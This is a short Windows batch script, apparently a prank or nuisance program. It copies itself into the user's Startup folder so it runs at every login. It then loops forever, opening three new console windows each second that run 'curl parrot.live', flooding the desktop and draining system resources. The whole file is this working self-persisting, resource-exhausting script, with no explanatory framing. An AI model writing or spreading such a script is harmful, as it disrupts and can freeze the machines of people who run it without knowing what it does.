@echo off
set "carpeta_destino=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

move "%~dp0%~nx0" "%carpeta_destino%"

:loop
start curl parrot.live
start curl parrot.live
start curl parrot.live
timeout /nobreak /t 1 >nul
goto loop